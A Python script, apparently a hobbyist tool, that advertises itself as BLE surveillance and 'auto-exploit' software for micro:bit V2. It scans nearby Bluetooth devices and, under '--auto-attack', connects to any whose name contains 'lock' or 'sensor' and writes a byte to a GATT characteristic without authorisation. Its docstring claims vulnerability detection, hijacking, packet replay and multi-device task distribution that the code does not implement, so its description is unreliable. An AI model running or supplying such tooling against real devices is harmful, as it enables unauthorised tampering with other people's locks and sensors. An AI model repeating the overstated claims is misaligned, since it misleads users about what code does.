# microbit_ble_surveillance.py

"""
BLE Surveillance + Auto-Exploit for micro:bit V2 (Multi-Device Support)

This script automates BLE surveillance, vulnerability detection, and auto-exploitation.
- Detects available micro:bit devices and distributes tasks dynamically
- Scans and monitors BLE devices (`--scan`)
- Logs discovered BLE devices (`--log <file>`)
- Detects vulnerabilities and auto-hijacks connections (`--auto-attack`)
- Performs replay attacks or GATT injections (`--replay <mac>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Scan and log all BLE devices:
   ```sh
   python microbit_ble_surveillance.py --scan --log ble_devices.json
   ```

2. Detect vulnerabilities and auto-exploit:
   ```sh
   python microbit_ble_surveillance.py --auto-attack
   ```

3. Replay captured BLE packets:
   ```sh
   python microbit_ble_surveillance.py --replay AA:BB:CC:DD:EE:FF
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse
import json

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# Scan for BLE Devices
async def ble_scan(log_file=None):
    """Scans and logs discovered BLE devices."""
    print("[+] Scanning for BLE devices...")
    devices = await BleakScanner.discover()
    discovered = [{"address": d.address, "name": d.name, "rssi": d.rssi} for d in devices]
    
    for device in discovered:
        print(f"[+] Found: {device['address']} - {device['name']} - RSSI: {device['rssi']}")
    
    if log_file:
        with open(log_file, "w") as f:
            json.dump(discovered, f)
            print(f"[+] Logged BLE devices to {log_file}")

# Auto-Exploit BLE Vulnerabilities
async def ble_auto_attack():
    """Detects vulnerabilities and attempts to hijack BLE connections."""
    print("[+] Searching for vulnerable BLE devices...")
    devices = await BleakScanner.discover()
    for device in devices:
        if "lock" in (device.name or "").lower() or "sensor" in (device.name or "").lower():
            print(f"[+] Potential exploit target: {device.address} ({device.name})")
            async with BleakClient(device.address) as client:
                await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", b'\x01')
                print(f"[+] Injected payload into {device.address}")

# Replay BLE Packets
async def ble_replay(target_mac):
    """Replays captured BLE packets to a target device."""
    print(f"[+] Replaying packets to {target_mac}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", b'\x01')
        print("[+] Sent replayed command!")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Surveillance + Auto-Exploit for micro:bit V2")
    parser.add_argument("--scan", help="Scan for BLE devices", action="store_true")
    parser.add_argument("--log", help="Log discovered BLE devices to a file", metavar="log_file")
    parser.add_argument("--auto-attack", help="Auto-exploit detected vulnerabilities", action="store_true")
    parser.add_argument("--replay", help="Replay captured BLE packets to a target", metavar="target_mac")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.scan:
        loop.run_until_complete(ble_scan(args.log))
    elif args.auto_attack:
        loop.run_until_complete(ble_auto_attack())
    elif args.replay:
        loop.run_until_complete(ble_replay(args.replay))
